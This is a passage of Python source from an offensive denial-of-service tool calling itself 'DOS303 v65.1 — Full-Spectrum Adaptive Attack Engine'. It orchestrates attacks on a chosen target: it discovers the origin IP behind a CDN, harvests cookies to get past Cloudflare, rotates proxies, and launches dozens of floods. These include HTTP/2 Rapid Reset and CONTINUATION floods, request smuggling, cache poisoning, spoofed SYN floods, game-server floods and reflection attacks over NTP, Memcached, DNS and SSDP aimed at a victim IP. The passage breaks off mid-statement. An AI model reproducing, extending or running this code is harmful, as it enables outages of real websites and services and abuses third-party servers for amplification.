                    ram_str = f" RAM: {rs['ram_pct']:.1f}% ({rs['ram_avail_gb']:.1f}GB avail)"
                    if rs['cpu_pct'] > 90:
                        logger.warning(f"   [CPU] HIGH: {rs['cpu_pct']:.1f}% — resource gate active")
                    if rs['ram_pct'] > 90:
                        logger.warning(f"   [RAM] HIGH: {rs['ram_pct']:.1f}% — resource gate active")

                mb_sent = to_mb(bytes_sent); gb_sent = to_gb(bytes_sent); mb_recv = to_mb(bytes_recv)
                if self.health_checker:
                    hs = self.health_checker.snapshot()
                    health_str = f"ALIVE({hs['status_code']}) {hs['response_ms']:.0f}ms" if hs["alive"] else f"DEAD({hs['error']})"
                    hcheck = f"ok={hs['checks_ok']} fail={hs['checks_fail']}"
                else:
                    health_str = "N/A"; hcheck = ""
                rows = self._build_rows(elapsed)
                total_ops = sum(r[1] for r in rows)
                rate_total = total_ops / elapsed if elapsed > 0 else 0
                if rate_total > self._peak_rate: self._peak_rate = rate_total
                W = 96
                top = "+" + "-" * (W - 2) + "+"
                bot = "+" + "-" * (W - 2) + "+"
                sep = "|" + "-" * (W - 2) + "|"
                def pad(s):
                    if len(s) > W - 2: s = s[:W - 5] + "..."
                    return "|" + s.ljust(W - 2) + "|"
                logger.info(top)
                logger.info(pad(f" ROUND {iteration} | T+{h:02d}:{m:02d}:{s:02d} | SENT: {mb_sent:.2f} MB ({gb_sent:.4f} GB) | RECV: {mb_recv:.2f} MB"))
                logger.info(pad(f" HEALTH: {health_str} ({hcheck}){net_health_str}"))
                logger.info(pad(f" RESOURCE: {cpu_str.strip()}{ram_str}"))
                if self.adaptive_controller:
                    ac = self.adaptive_controller.snapshot()
                    logger.info(pad(f" ADAPTIVE: workers={ac['workers']:,} cpu={ac['cpu_pct']:.1f}% ram={ac['ram_pct']:.1f}%"))
                if _resource_gate.is_paused():
                    logger.info(pad(f" RESOURCE GATE: PAUSED ({_resource_gate.reason()})"))
                if self.adaptive_limiter:
                    logger.info(pad(f" RATE: {self.adaptive_limiter.get_rate()}/s (base {self.adaptive_limiter.base_rate}/s, backoffs={self.adaptive_limiter.backoff_count}, ssl_err={self.adaptive_limiter._ssl_errors})"))
                logger.info(sep)
                logger.info(pad(f" {'ATTACK':<18} {'COUNT':>12} {'RATE/s':>9}  DETAIL"))
                logger.info(sep)
                for name, count, rate, detail, err in rows:
                    try:
                        if count == 0 and err:
                            line = f" {name:<18} {count:>12,} {0.0:>9.1f}  !! {err[:40]:<37}"
                        else:
                            line = f" {name:<18} {count:>12,} {rate:>9.1f}  {detail[:40]:<40}"
                        logger.info(pad(line))
                    except Exception as re:
                        logger.info(pad(f" {name}: row_err {re}"))
                logger.info(sep)
                logger.info(pad(f" TOTAL OPS: {total_ops:,} | RATE: {rate_total:.1f}/s | PEAK: {self._peak_rate:.1f}/s"))
                logger.info(pad(f" NET: up {mbps_out:.2f}Mbps | down {mbps_in:.2f}Mbps | {pps_out:.0f}pps | pkts={pkts_sent:,} | err={err_out}"))
                logger.info(bot)
                delta_total = total_ops - self._prev_total
                delta_success = self.http_attack.requests_sent - self._prev_success if self.http_attack else 0
                self._prev_total = total_ops
                self._prev_success = self.http_attack.requests_sent if self.http_attack else 0
                er = 1 - (delta_success / delta_total) if delta_total > 0 else 0
                if er < 0.2: self.health_status = "OK"
                elif er < 0.5: self.health_status = "STRESSED"
                else: self.health_status = "DEGRADED"
            except Exception as e:
                import traceback
                self._monitor_crashes += 1
                logger.error(f"MONITOR CRASH #{self._monitor_crashes}: {type(e).__name__}: {e}")
                logger.error(f"traceback:\n{traceback.format_exc()}")
                stop_waiter.wait(timeout=5.0)
        try:
            elapsed = time.time() - self.start_time
            if self.net_monitor:
                bs = self.net_monitor.total_bytes_sent()
                br = self.net_monitor.total_bytes_recv()
                ps = self.net_monitor.total_pkts_sent()
            else: bs = br = ps = 0
            logger.info("\n" + "=" * 70)
            logger.info("FINAL REPORT")
            logger.info("=" * 70)
            logger.info(f"Duration: {elapsed:.1f}s")
            logger.info(f"Peak rate: {self._peak_rate:.1f}/s")
            logger.info(f"TOTAL SENT: {humanbytes(bs)} ({to_mb(bs):.2f} MB | {to_gb(bs):.4f} GB)")
            logger.info(f"TOTAL RECV: {humanbytes(br)}")
            logger.info(f"TOTAL PKTS SENT: {ps:,}")
            if self.http_attack:
                logger.info(f"HTTP: {self.http_attack.requests_sent:,} sent | err: {self.http_attack.curl_errors:,} | tmo: {self.http_attack.timeouts:,}")
                if self.http_attack.error_types:
                    logger.info(f"HTTP error breakdown: {dict(self.http_attack.error_types)}")
                if self.http_attack.method_counts:
                    logger.info(f"HTTP method breakdown: {dict(self.http_attack.method_counts)}")
            if self.adaptive_limiter:
                logger.info(f"Adaptive limiter: {self.adaptive_limiter.backoff_count} backoffs, {self.adaptive_limiter._ssl_errors} ssl errors skipped, final rate {self.adaptive_limiter.get_rate()}/s")
            if self.health_checker:
                hs = self.health_checker.snapshot()
                logger.info(f"HEALTH: {'ALIVE' if hs['alive'] else 'DEAD'} | last: {hs['status_code']} | ok={hs['checks_ok']} fail={hs['checks_fail']}")
            if self.net_health:
                nh = self.net_health.snapshot()
                logger.info(f"NET HEALTH: {nh['health']} | paused={nh['paused']}")
            if self.resource_monitor:
                rs = self.resource_monitor.snapshot()
                logger.info(f"RESOURCE: CPU {rs['cpu_pct']:.1f}% | RAM {rs['ram_pct']:.1f}% | Net {rs['net_mbps_out']:.2f}/{rs['net_mbps_in']:.2f} Mbps")
            logger.info(f"Monitor crashes: {self._monitor_crashes}")
            logger.info("=" * 70)
        except Exception as e:
            logger.error(f"Final report error: {e}")

    async def run(self):
        show_banner()
        logger.info("=" * 70)
        logger.info("DOS303 v65.1 — Full-Spectrum Adaptive Attack Engine (FINAL)")
        logger.info(f"GIL switch interval: {sys.getswitchinterval()}s")
        logger.info(f"Platform: {PLATFORM_NAME} | sys.platform={sys.platform}")
        logger.info(f"Event loop: {_LOOP_BACKEND}")
        logger.info(f"FastUAGenerator: 10M+ UA/sec capacity")
        logger.info(f"JA3/Akamai profiles: {len(JA3_PROFILES)} versions")
        logger.info(f"BrowserForge: {'OK' if BROWSERFORGE_AVAILABLE else 'NO'}")
        logger.info(f"Playwright: {'OK' if PLAYWRIGHT_AVAILABLE else 'NO'}")
        logger.info(f"Cloudscraper: {'OK' if CLOUDSCRAPER_AVAILABLE else 'NO'}")
        logger.info(f"HTTP methods: 25 + WAF bypass (method tampering + encoding)")
        logger.info(f"L4 methods: 47 (incl. SLP 2200x, RIPv1 131x, Quake 63.9x, PQC, LAND, Jumbo)")
        logger.info(f"extra_fp: {'ENABLED (dict)' if CURL_CFFI_AVAILABLE else 'DISABLED'}")
        logger.info(f"Brute mode: {'ON' if self.brute else 'OFF'}")
        logger.info(f"SSL_VERIFYHOST=0 + SSL_VERIFYPEER=0: ENABLED (SNI fix)")
        logger.info(f"v65.1: Adaptive ThreadPool FIX | GraphQL FIX | H3 ALPN FIX | Brotli Bomb | Land Attack")
        logger.info("=" * 70)

        logger.info("\n[STEP 0/9] PRIVILEGE CHECK")
        self.priv_info = PrivilegeChecker.check()
        logger.info(f"   Admin: {'YES' if self.priv_info['is_admin'] else 'NO'}")
        logger.info(f"   Raw socket: {'OK' if self.priv_info['raw_socket_ok'] else 'NO'}")
        logger.info(f"   curl_cffi: {'OK' if CURL_CFFI_AVAILABLE else 'NO'}")
        logger.info(f"   h2: {H2_VERSION} ({'PATCHED' if H2_PATCHED else 'VULN'})")
        logger.info(f"   DNS spoofer: OK")
        logger.info(f"   SNI spoofer: OK")
        logger.info(f"   WAF bypass engine: OK")

        logger.info("\n[STEP 1/9] SYSTEM ANALYSIS + ADAPTIVE CONTROLLER")
        if self.args.workers or self.args.connections or self.args.rate:
            self.capacity = {"level": 5, "level_name": "Custom", "workers": self.args.workers or 500,
                             "connections": self.args.connections or 1000, "packet_rate": self.args.rate or 2000}
        else:
            self.capacity = await SystemAnalyzer().analyze()
        logger.info(f"   Workers: {self.capacity['workers']:,}")

        self.adaptive_controller = AdaptiveController(
            initial_workers=self.capacity["workers"], min_workers=10,
            max_workers=max(5000, self.capacity["workers"] * 2))
        self.adaptive_controller.start()
        logger.info(f"   Adaptive controller: OK (workers={self.capacity['workers']:,})")

        self.l4_executor = ThreadPoolExecutor(max_workers=40, thread_name_prefix="l4")
        logger.info("   L4 executor: 40 threads (v65.1)")
        self.global_sem = asyncio.Semaphore(500)
        self.slowloris_sem = asyncio.Semaphore(200)
        logger.info("   Global cap: 500, Slowloris cap: 200")

        logger.info("\n[STEP 2/9] RATE LIMITING + NET HEALTH + RESOURCE MONITOR")
        self.rate_limiter = RateLimiter(
            rate_per_sec=min(self.capacity["packet_rate"], self.args.rate_limit or 5000),
            burst=min(self.capacity["packet_rate"] * 2, 20000))
        self.adaptive_limiter = AdaptiveRateLimiter(
            base_rate=min(self.capacity["packet_rate"], self.args.rate_limit or 5000),
            burst=min(self.capacity["packet_rate"] * 2, 20000),
            min_rate=500, max_rate=50000)
        self.net_monitor = NetworkMonitor(interval=5.0)
        if self.net_monitor.start():
            logger.info(f"   NetworkMonitor active, base rate {self.rate_limiter.rate}/s")
        self.net_health = NetworkHealthMonitor(interval=5.0,
                                                min_upload_mbps=getattr(self.args, "net_min_mbps", 0.1),
                                                max_upload_mbps=getattr(self.args, "net_max_mbps", 500.0))
        self.net_health.rate_limiter = self.rate_limiter
        self.net_health.adaptive_limiter = self.adaptive_limiter
        if self.net_health.start():
            logger.info(f"   NetworkHealthMonitor active (min={self.net_health.min_upload_mbps}Mbps, max={self.net_health.max_upload_mbps}Mbps)")
            logger.info(f"   v65.1: DEGRADED reduces rate 50% on BOTH limiters")
        self.resource_monitor = ResourceMonitor(interval=2.0)
        if self.resource_monitor.start():
            logger.info(f"   ResourceMonitor active (interval=2s, CPU/RAM/Net)")
        logger.info(f"   Resource gate: RAM>90% or CPU>95% → HTTP workers pause")

        logger.info("\n[STEP 2.5/9] PROXY PROMPT")
        proxy_mode = self.args.proxy_mode
        if proxy_mode == "waitout" and not self.args.no_proxy:
            logger.info("   Awaiting user input...")
            if not ProxyPrompt.ask():
                proxy_mode = "none"; logger.info("   User chose: DISABLED")
            else: logger.info("   User chose: ENABLED")
        if self.args.no_proxy:
            proxy_mode = "none"; logger.info("   --no-proxy flag: DISABLED")

        logger.info("\n[STEP 3/9] TARGET INPUT")
        target = self.args.target
        if not target: target = TargetPrompt.ask()
        target = sanitize_url(target)
        self.target_info = await TargetAnalyzer.analyze(target)
        target = self.target_info["target"]
        host = self.target_info["host"]
        port = self.target_info["port"]
        scheme = self.target_info["scheme"]
        original_host = self.target_info["original_host"]
        use_ssl = (scheme == "https")
        logger.info(f"   Target: {target}")

        logger.info("\n[STEP 3.5/9] HEALTH CHECKER")
        self.health_checker = HealthChecker(target, interval=10.0,
                                            original_host=original_host,
                                            origin_ip=self.origin_ip, origin_port=self.origin_port)
        self.health_checker.start()
        logger.info("   Health check every 10s (timeout=4s, curl_cffi)")

        logger.info("\n[STEP 4/9] WAF DETECTION")
        loop = asyncio.get_running_loop()
        wafs = await loop.run_in_executor(self.l4_executor, WAFDetector.detect, target)
        logger.info(f"   Detected: {wafs if wafs else 'none'}")
        self.is_litespeed = await loop.run_in_executor(self.l4_executor, WAFDetector.is_litespeed, target)
        if self.is_litespeed: logger.warning("   LiteSpeed detected — H2 attacks will be limited")

        logger.info("\n[STEP 5/9] ORIGIN IP DISCOVERY (16+ sources)")
        origin_ips = []
        if not self.args.no_origin:
            p = urlparse(target)
            finder = OriginIPFinder(p.hostname,
                shodan_api_key=self.args.shodan_api_key,
                securitytrails_api_key=getattr(self.args, 'securitytrails_api_key', None),
                censys_api_id=getattr(self.args, 'censys_api_id', None),
                censys_api_secret=getattr(self.args, 'censys_api_secret', None),
                virustotal_api_key=getattr(self.args, 'virustotal_api_key', None))
            origin_ips = await loop.run_in_executor(self.l4_executor, finder.find)
            if origin_ips:
                first = origin_ips[0]
                self.origin_ip = first["ip"]; self.origin_port = first["port"]
                logger.info(f"   Origin IP set: {self.origin_ip}:{self.origin_port} ({first['server']})")
                logger.info(f"   Target remains: {target} (DOMAIN — SNI correct)")
                if "apache" in (first.get("server") or "").lower() or "nginx" in (first.get("server") or "").lower():
                    self.is_litespeed = False
                    logger.info("   Not LiteSpeed — H2 ENABLED")

        logger.info("\n[STEP 5.5/9] QUIC PROBE + H2 ALPN PROBE")
        if not self.args.no_quicleak:
            probe = QUICLeakAttack(host, port, self.stop_event, self.thread_stop, self.args)
            self.quic_probe_result = await probe._probe_quic()
            logger.info(f"   QUIC available: {'YES' if self.quic_probe_result else 'NO'}")
        try:
            self.h2_alpn_available = await probe_h2_alpn(host, port)
            logger.info(f"   H2 ALPN available: {'YES' if self.h2_alpn_available else 'NO'}")
        except Exception as e:
            logger.warning(f"   H2 ALPN probe failed: {e}")
            self.h2_alpn_available = False

        logger.info("\n[STEP 6/9] BROWSER HARVEST")
        if CURL_CFFI_AVAILABLE and not self.args.no_browser:
            result = await harvest_with_curl_cffi(target, timeout=15)
            if result["ok"]:
                logger.info(f"   [harvest/curl_cffi] got {len(result['cookies'])} cookies (status={result.get('status', '?')})")
                self.browser_harvester = BrowserSessionHarvester(target)
                self.browser_harvester.cookies = result["cookies"]
                self.browser_harvester.headers = result["headers"]
                self.browser_harvester.user_agent = result.get("ua", "chrome136")
                self.browser_session = self.browser_harvester
            elif PLAYWRIGHT_AVAILABLE:
                logger.info("   [harvest] curl_cffi failed, trying Playwright...")
                result = await loop.run_in_executor(None, _run_harvest_in_proactor_thread, target, 30)
                if result["ok"]:
                    logger.info(f"   [harvest/pw] got {len(result['cookies'])} cookies")
                    self.browser_harvester = BrowserSessionHarvester(target)
                    self.browser_harvester.cookies = result["cookies"]
                    self.browser_harvester.headers = result["headers"]
                    self.browser_harvester.user_agent = result["ua"]
                    self.browser_session = self.browser_harvester
                else:
                    logger.warning("   [harvest] both methods failed")
                    self.browser_harvester = None
            else:
                logger.warning(f"   [harvest] failed: {result.get('error', 'unknown')}")
                self.browser_harvester = None
        elif PLAYWRIGHT_AVAILABLE and not self.args.no_browser:
            result = await loop.run_in_executor(None, _run_harvest_in_proactor_thread, target, 30)
            if result["ok"]:
                logger.info(f"   [harvest/pw] got {len(result['cookies'])} cookies")
                self.browser_harvester = BrowserSessionHarvester(target)
                self.browser_harvester.cookies = result["cookies"]
                self.browser_harvester.headers = result["headers"]
                self.browser_harvester.user_agent = result["ua"]
                self.browser_session = self.browser_harvester
            else:
                logger.warning("   [harvest] failed, continuing without cookies")
                self.browser_harvester = None
        else:
            logger.info("   [harvest] skipped (no curl_cffi/Playwright or --no-browser)")

        logger.info("\n[STEP 6.5/9] CF BYPASS")
        self.cf_session = CloudflareBypassLayer(target, proxy_mgr=None)
        cf_ok = await self.cf_session.bootstrap()
        logger.info(f"   {'OK' if cf_ok else 'failed'}")

        logger.info("\n[STEP 7/9] PROXY")
        if proxy_mode == "none":
            self.proxy_mgr = None
            logger.info("   DISABLED")
        else:
            self.proxy_mgr = ProxyManager(mode=proxy_mode)
            if self.args.residential_provider:
                self.proxy_mgr.set_residential(
                    provider=self.args.residential_provider,
                    user=self.args.residential_user,
                    password=self.args.residential_pass)
                logger.info(f"   Residential: {self.args.residential_provider}")
            n = await self.proxy_mgr.load()
            if n == 0: self.proxy_mgr = None
            else: logger.info(f"   Loaded {n} proxies from {len(PROXY_SOURCES)} sources (DNS-tested)")

        game_port = int(getattr(self.args, 'game_port', 0)) or None

        logger.info("\n[STEP 8/9] LAUNCHING ATTACKS")
        logger.info("=" * 70)
        logger.info(f"Target: {target} (DOMAIN)")
        if self.origin_ip: logger.info(f"Origin IP: {self.origin_ip}:{self.origin_port} (RESOLVE + SSL_VERIFYHOST=0)")
        logger.info(f"Workers: {self.capacity['workers']:,}")
        logger.info(f"H2: {'ENABLED' if not self.is_litespeed else 'SKIPPED'}")
        logger.info(f"H2 ALPN probe: {'YES' if self.h2_alpn_available else 'NO'}")
        logger.info(f"QUIC: {'YES' if self.quic_probe_result else 'NO'}")
        logger.info(f"extra_fp: {'ENABLED (dict)' if CURL_CFFI_AVAILABLE else 'DISABLED'}")
        logger.info(f"Brute: {'ON' if self.brute else 'OFF'}")
        logger.info(f"NetHealth: min={self.net_health.min_upload_mbps}Mbps max={self.net_health.max_upload_mbps}Mbps")
        logger.info("=" * 70)

        browser_headers = {}
        browser_cookies = []
        if self.browser_harvester:
            browser_headers = self.browser_harvester.headers or {}
            browser_cookies = self.browser_harvester.cookies or []

        self.http_attack = HTTPFloodAttack(target, self.capacity["workers"],
            self.proxy_mgr, self.ua_gen, self.hdr_mgr, self.path_mgr,
            self.stop_event, self.thread_stop, self.args,
            rate_limiter=self.rate_limiter, net_monitor=self.net_monitor,
            browser_cookies=browser_cookies, browser_headers=browser_headers,
            original_host=original_host, origin_ip=self.origin_ip, origin_port=self.origin_port,
            cf_session=self.cf_session, identity_rotator=self.identity_rotator,
            adaptive_limiter=self.adaptive_limiter, litespeed_mode=self.is_litespeed,
            brute=self.brute, adaptive_controller=self.adaptive_controller,
            resource_monitor=self.resource_monitor, net_health=self.net_health)
        self.attacks.append(self.http_attack)

        if not self.args.no_hammer:
            hammer = HammerAttack(host, port, self.stop_event, self.thread_stop, self.args,
                turbo=self.args.hammer_turbo or 40, rate_limiter=self.rate_limiter,
                original_host=original_host, use_https=use_ssl)
            hammer._executor = ThreadPoolExecutor(max_workers=60, thread_name_prefix="hammer")
            self.attacks.append(hammer)

        if not self.args.no_cve:
            self.attacks.append(CVEExploiter(target, self.stop_event, self.thread_stop, self.args,
                original_host=original_host, origin_ip=self.origin_ip, origin_port=self.origin_port))

        if not self.args.no_slowloris:
            self.attacks.append(SlowlorisAttack(host, port, min(150, self.capacity["connections"] // 30),
                self.stop_event, self.thread_stop, self.args, use_ssl=use_ssl, original_host=original_host, global_sem=self.slowloris_sem))
        if not self.args.no_slowpost:
            self.attacks.append(SlowPostAttack(host, port, min(100, self.capacity["connections"] // 40),
                self.stop_event, self.thread_stop, self.args, use_ssl=use_ssl, original_host=original_host, global_sem=self.slowloris_sem))
        if not self.args.no_slowread:
            self.attacks.append(SlowReadAttack(host, port, min(100, self.capacity["connections"] // 40),
                self.stop_event, self.thread_stop, self.args, use_ssl=use_ssl, original_host=original_host, global_sem=self.slowloris_sem))
        if not self.args.no_socket:
            self.attacks.append(SocketFloodAttack(host, port, min(1500, self.capacity["packet_rate"]),
                self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter,
                original_host=original_host, global_sem=self.global_sem))

        if not getattr(self.args, 'no_cfb', False) and CURL_CFFI_AVAILABLE:
            self.attacks.append(CFBAttack(target, self.stop_event, self.thread_stop, self.args, self.proxy_mgr))

        if not getattr(self.args, 'no_slp', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(SLPAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_ldap', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(LDAPAmplificationAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_qotd', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(QOTDAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_tftp', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(TFTPAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_snmp2', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(SNMPv2Attack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_netbios', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(NetBIOSAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_mdns', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(mDNSAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_portmap', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(PortmapAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_steam', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(SteamAttack(host, game_port or 27015, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))
        if not getattr(self.args, 'no_quake', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(QuakeAttack(host, game_port or 27960, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))
        if not getattr(self.args, 'no_dnsedns0', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(DNSEDNS0Attack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_ripv1', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(RIPv1Attack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_kad', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(KadAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_bittorrent', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(BitTorrentAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_pqc', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(PQCQUICInitialAttack(host, port, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))

        if not getattr(self.args, 'no_vse', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(VSEAttack(host, game_port or 27015, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))
        if not getattr(self.args, 'no_ts3', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(TS3Attack(host, game_port or 9987, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))
        if not getattr(self.args, 'no_fivem', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(FIVEMAttack(host, game_port or 30120, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))
        if not getattr(self.args, 'no_fivem_token', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(FIVEMTokenAttack(host, game_port or 30120, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))
        if not getattr(self.args, 'no_minecraft', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(MinecraftAttack(host, game_port or 25565, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))
        if not getattr(self.args, 'no_mcbot', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(MCBOTAttack(host, game_port or 25565, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))
        if not getattr(self.args, 'no_mcpe', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(MCPEAttack(host, game_port or 19132, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))

        if not getattr(self.args, 'no_ard', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(ARDAttack(host, 3283, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))
        if not getattr(self.args, 'no_rdp', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(RDPAttack(host, 3389, self.stop_event, self.thread_stop, self.args, self.rate_limiter, self.args.victim_ip))

        if self.args.icmp and self.priv_info["raw_socket_ok"]:
            self.attacks.append(ICMPFloodAttack(host, self.capacity["packet_rate"],
                self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if self.args.spoof_ip and self.priv_info["raw_socket_ok"]:
            self.attacks.append(IPSpoofSYNFlood(host, port, self.capacity["packet_rate"],
                self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))

        # v65.1: skip H2 attacks if ALPN not available (unless force_h2)
        skip_h2 = (self.is_litespeed or not self.h2_alpn_available) and not self.args.force_h2
        if skip_h2:
            logger.warning(f"   H2 attacks skipped (ALPN={'no' if not self.h2_alpn_available else 'yes'}, LiteSpeed={self.is_litespeed})")
        if not skip_h2 and H2_AVAILABLE:
            if not self.args.no_h2rapid: self.attacks.append(HTTP2RapidResetAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
            if not self.args.no_spca: self.attacks.append(SPCAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
            if not self.args.no_cont: self.attacks.append(ContinuationFloodAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
            if not self.args.no_h2bomb: self.attacks.append(HTTP2BombAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
            if not self.args.no_hpackbomb: self.attacks.append(H2HPACKBombAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
            if not self.args.no_prio: self.attacks.append(PriorityFloodAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
            if not self.args.no_smuggle: self.attacks.append(H2SmugglingAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
            if not self.args.no_myr: self.attacks.append(MadeYouResetAttack(host, port, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))

        if not self.args.no_rangeamp:
            ra = RangeAmpAttack(target, self.stop_event, self.thread_stop, self.args,
                rate_limiter=self.rate_limiter, original_host=original_host, global_sem=self.global_sem,
                origin_ip=self.origin_ip, origin_port=self.origin_port)
            ra._executor = self.l4_executor
            self.attacks.append(ra)

        if not self.args.no_memcached and self.priv_info["raw_socket_ok"]:
            self.attacks.append(MemcachedAmplificationAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not self.args.no_ntp and self.priv_info["raw_socket_ok"]:
            self.attacks.append(NTPAmplificationAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not self.args.no_cldap and self.priv_info["raw_socket_ok"]:
            self.attacks.append(CLDAPAmplificationAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not self.args.no_ssdp and self.priv_info["raw_socket_ok"]:
            self.attacks.append(SSDPAmplificationAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not self.args.no_dns and self.priv_info["raw_socket_ok"]:
            self.attacks.append(DNSAmplificationAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not self.args.no_chargen and self.priv_info["raw_socket_ok"]:
            self.attacks.append(ChargenAmplificationAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not self.args.no_tcpamp and self.priv_info["raw_socket_ok"]:
            self.attacks.append(TCPAmplificationAttack(host, port, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not self.args.no_qdcr and self.priv_info["raw_socket_ok"]:
            self.attacks.append(QDCRAttack(host, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not self.args.no_udpslow and self.priv_info["raw_socket_ok"]:
            self.attacks.append(UDPSlowlorisHybridAttack(host, self.args.victim_ip, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))

        if not self.args.no_smurf and self.priv_info["raw_socket_ok"]:
            broadcast = self.args.smurf_broadcast or "255.255.255.255"
            self.attacks.append(SmurfAttack(broadcast, self.args.victim_ip or host, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not self.args.no_fraggle and self.priv_info["raw_socket_ok"]:
            broadcast = self.args.smurf_broadcast or "255.255.255.255"
            self.attacks.append(FraggleAttack(broadcast, self.args.victim_ip or host, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not self.args.no_icmpfrag and self.priv_info["raw_socket_ok"]:
            self.attacks.append(ICMPFragmentFloodAttack(host, self.capacity["packet_rate"], self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))

        if not self.args.no_macspoof and SCAPY_AVAILABLE and self.priv_info["raw_socket_ok"]:
            self.attacks.append(MACSpoofAttack(host, self.stop_event, self.thread_stop, self.args))
        if not self.args.no_tcpts and self.priv_info["raw_socket_ok"]:
            self.attacks.append(TCPTimestampSpoofAttack(host, port, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))

        # v65.1: Land Attack و Jumbo Frame
        if not getattr(self.args, 'no_land', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(LandAttack(host, port, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))
        if not getattr(self.args, 'no_jumbo', False) and self.priv_info["raw_socket_ok"]:
            self.attacks.append(JumboFrameAttack(host, port, self.stop_event, self.thread_stop, self.args, rate_limiter=self.rate_limiter))

        if not self.args.no_smuggle_http:
            self.attacks.append(RequestSmugglingAttack(target, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
        if not self.args.no_cachepoison:
            self.attacks.append(CachePoisoningAttack(target, self.stop_event, self.thread_stop, self.args, original_host=original_host, global_sem=self.global_sem))
        if not self.args.no_fatigue:
